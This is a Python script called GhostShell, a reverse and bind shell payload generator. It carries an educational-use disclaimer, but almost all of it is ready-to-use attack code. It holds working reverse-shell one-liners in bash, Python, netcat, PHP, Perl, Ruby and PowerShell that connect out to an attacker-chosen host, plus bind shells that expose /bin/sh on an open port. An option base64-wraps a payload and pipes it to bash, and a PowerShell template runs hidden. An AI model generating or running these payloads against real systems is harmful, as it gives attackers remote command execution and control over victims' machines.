#!/usr/bin/env python3
"""
GhostShell - Educational payload / reverse & bind shell generator
Developed by D3F4ULT

FOR AUTHORIZED EDUCATIONAL USE AND LAB TESTING ONLY.
Never use against systems you do not own or lack explicit written permission to test.

Usage:
  python ghostshell.py --type reverse --lhost 192.168.1.10 --lport 4444 --lang bash
  python ghostshell.py --type bind --lport 4444 --lang python
  python ghostshell.py --list
"""

import argparse
import base64
import ipaddress
import re
import sys
from datetime import datetime

BANNER = r"""
   ______ _               _   _____ __         ____
  / ____/(_)___  _________| |_/ ___// /_  ___  / / /
 / / __ / / __ \/ ___/ ___/ __/\__ \/ __ \/ _ \/ / / 
/ /_/ // / /_/ (__  ) /__/ /_ ___/ / / / /  __/ / /  
\____//_/\____/____/\___/\__/____/_/ /_/\___/_/_/   
                                                   
  Educational payload & shell generator
  developed by D3F4ULT
"""

DISCLAIMER = """
[!] EDUCATIONAL / LAB USE ONLY
[!] Use only on systems you own or have explicit written authorization to test.
[!] Unauthorized access to computer systems is illegal.
"""

SUPPORTED_LANGS = ("bash", "python", "nc", "php", "perl", "ruby", "powershell")

TEMPLATES = {
    "bash_reverse": {
        "lang": "bash",
        "type": "reverse",
        "desc": "Classic bash /dev/tcp reverse shell",
        "template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    },
    "bash_reverse_udp": {
        "lang": "bash",
        "type": "reverse",
        "desc": "Bash UDP reverse (limited support)",
        "template": "bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
    },
    "python_reverse": {
        "lang": "python",
        "type": "reverse",
        "desc": "Python3 reverse shell (socket)",
        "template": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{LHOST}\",{LPORT}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
    },
    "python_reverse_short": {
        "lang": "python",
        "type": "reverse",
        "desc": "Shorter Python reverse (one-liner style)",
        "template": (
            "python3 -c 'import os,pty,socket;s=socket.socket();"
            "s.connect((\"{LHOST}\",{LPORT}));"
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
            "pty.spawn(\"/bin/sh\")'"
        ),
    },
    "nc_reverse": {
        "lang": "nc",
        "type": "reverse",
        "desc": "Netcat traditional reverse shell",
        "template": "nc -e /bin/sh {LHOST} {LPORT}",
    },
    "nc_reverse_mkfifo": {
        "lang": "nc",
        "type": "reverse",
        "desc": "Netcat without -e (mkfifo method)",
        "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    },
    "php_reverse": {
        "lang": "php",
        "type": "reverse",
        "desc": "PHP reverse shell (fsockopen)",
        "template": (
            "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
    },
    "perl_reverse": {
        "lang": "perl",
        "type": "reverse",
        "desc": "Perl reverse shell",
        "template": (
            "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            "exec(\"/bin/sh -i\");}};'"
        ),
    },
    "ruby_reverse": {
        "lang": "ruby",
        "type": "reverse",
        "desc": "Ruby reverse shell",
        "template": (
            "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;"
            "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
    },
    "powershell_reverse": {
        "lang": "powershell",
        "type": "reverse",
        "desc": "PowerShell reverse TCP (Windows)",
        "template": (
            "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%{{0}};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            "$sendback = (iex $data 2>&1 | Out-String );"
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}};$client.Close()\""
        ),
    },
    "powershell_reverse_encoded": {
        "lang": "powershell",
        "type": "reverse",
        "desc": "PowerShell reverse with base64 encoding hint",
        "template": (
            "powershell -nop -w hidden -enc <BASE64_UNICODE_PAYLOAD>"
        ),
    },
    "bash_bind": {
        "lang": "bash",
        "type": "bind",
        "desc": "Bash bind shell (nc required on target)",
        "template": "nc -lvp {LPORT} -e /bin/sh",
    },
    "python_bind": {
        "lang": "python",
        "type": "bind",
        "desc": "Python3 bind shell",
        "template": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
            "s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);"
            "c,a=s.accept();"
            "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
    },
    "nc_bind": {
        "lang": "nc",
        "type": "bind",
        "desc": "Netcat bind shell",
        "template": "nc -lvp {LPORT} -e /bin/sh",
    },
    "php_bind": {
        "lang": "php",
        "type": "bind",
        "desc": "PHP bind shell",
        "template": (
            "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);"
            "socket_bind($s,\"0.0.0.0\",{LPORT});"
            "socket_listen($s,1);$c=socket_accept($s);"
            "while(1){{$i=socket_read($c,2048);"
            "socket_write($c,shell_exec($i));}}'"
        ),
    },
}


def list_payloads():
    print(BANNER)
    print(DISCLAIMER)
    print("[*] Available payloads:\n")
    print(f"{'KEY':<28} {'LANG':<12} {'TYPE':<8} DESCRIPTION")
    print("-" * 80)
    for key, meta in sorted(TEMPLATES.items()):
        print(f"{key:<28} {meta['lang']:<12} {meta['type']:<8} {meta['desc']}")
    print()


def generate(payload_key: str, lhost: str, lport: int, encode: bool = False) -> str:
    if payload_key not in TEMPLATES:
        raise ValueError(f"Unknown payload key: {payload_key}")

    meta = TEMPLATES[payload_key]
    raw = meta["template"].format(LHOST=lhost or "0.0.0.0", LPORT=lport)

    if encode:
        b64 = base64.b64encode(raw.encode()).decode()
        return f"echo {b64} | base64 -d | bash"

    return raw


def validate_lhost(value: str) -> str:
    if not value or not value.strip():
        raise argparse.ArgumentTypeError("lhost cannot be empty")
    value = value.strip()
    try:
        ipaddress.ip_address(value)
        return value
    except ValueError:
        pass
    if len(value) > 253:
        raise argparse.ArgumentTypeError(f"invalid lhost: {value!r} (hostname too long)")
    if re.match(
        r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(?:\.(?!-)[A-Za-z0-9-]{1,63}(?<!-))*$",
        value,
    ):
        return value
    raise argparse.ArgumentTypeError(
        f"invalid lhost: {value!r} (expected IPv4, IPv6, or hostname)"
    )


def main():
    parser = argparse.ArgumentParser(
        description="GhostShell - Educational payload / shell generator (D3F4ULT)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Examples:\n"
               "  python ghostshell.py --list\n"
               "  python ghostshell.py -t reverse -H 10.10.14.5 -p 443 -l bash\n"
               "  python ghostshell.py -t reverse -H 10.10.14.5 -p 4444 -l python --encode\n"
               "  python ghostshell.py -t bind -p 4444 -l python",
    )
    parser.add_argument("-t", "--type", choices=["reverse", "bind"], help="Shell type")
    parser.add_argument(
        "-l",
        "--lang",
        choices=SUPPORTED_LANGS,
        help="Language / tool (bash, python, nc, php, perl, ruby, powershell)",
    )
    parser.add_argument(
        "-H",
        "--lhost",
        type=validate_lhost,
        help="Listener / attacker IP or hostname (required for reverse)",
    )
    parser.add_argument("-p", "--lport", type=int, help="Port (1-65535)")
    parser.add_argument("-k", "--key", help="Exact payload key (overrides -t/-l)")
    parser.add_argument(
        "--encode",
        action="store_true",
        help="Wrap payload in base64 then pipe through bash (echo ... | base64 -d | bash)",
    )
    parser.add_argument("--list", action="store_true", help="List all available payloads")
    parser.add_argument("-o", "--output", help="Write payload to file instead of stdout")

    args = parser.parse_args()

    if args.list or (not args.type and not args.key):
        list_payloads()
        return

    if args.lport is not None and not (1 <= args.lport <= 65535):
        parser.error("--lport must be between 1 and 65535")

    if args.key:
        key = args.key
        if key not in TEMPLATES:
            print(f"[-] Unknown payload key: {key}")
            print("[*] Use --list to see available keys")
            sys.exit(1)
        meta = TEMPLATES[key]
        if args.lport is None:
            parser.error("--lport is required")
        if meta["type"] == "reverse" and not args.lhost:
            parser.error("--lhost is required for reverse shells (even with --key)")
    else:
        if not args.type:
            parser.error("--type is required when not using --key (or use --list)")
        if not args.lang:
            parser.error("--lang is required when not using --key")
        if args.lport is None:
            parser.error("--lport is required")
        if args.type == "reverse" and not args.lhost:
            parser.error("--lhost is required for reverse shells")

        candidates = [
            k
            for k, m in TEMPLATES.items()
            if m["type"] == args.type and m["lang"] == args.lang.lower()
        ]
        if not candidates:
            print(f"[-] No payload found for type={args.type} lang={args.lang}")
            print("[*] Use --list to see available combinations")
            sys.exit(1)
        key = candidates[0]
        if len(candidates) > 1:
            for c in candidates:
                if "udp" not in c and "short" not in c and "encoded" not in c:
                    key = c
                    break
        meta = TEMPLATES[key]

    try:
        payload = generate(key, args.lhost, args.lport, encode=args.encode)
    except ValueError as e:
        print(f"[-] {e}")
        sys.exit(1)
    except KeyError as e:
        print(f"[-] Template format error: {e}")
        sys.exit(1)

    print(BANNER)
    print(DISCLAIMER)
    print(f"[+] Payload : {key}")
    print(f"[+] Lang    : {meta['lang']}")
    print(f"[+] Type    : {meta['type']}")
    print(f"[+] Desc    : {meta['desc']}")
    if args.lhost:
        print(f"[+] LHOST   : {args.lhost}")
    print(f"[+] LPORT   : {args.lport}")
    print(f"[+] Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    print("--- PAYLOAD ---")
    print(payload)
    print("--- END ---")
    print()

    if args.output:
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(payload + "\n")
            print(f"[+] Written to {args.output}")
        except OSError as e:
            print(f"[-] Failed to write file: {e}")
            sys.exit(1)


if __name__ == "__main__":
    main()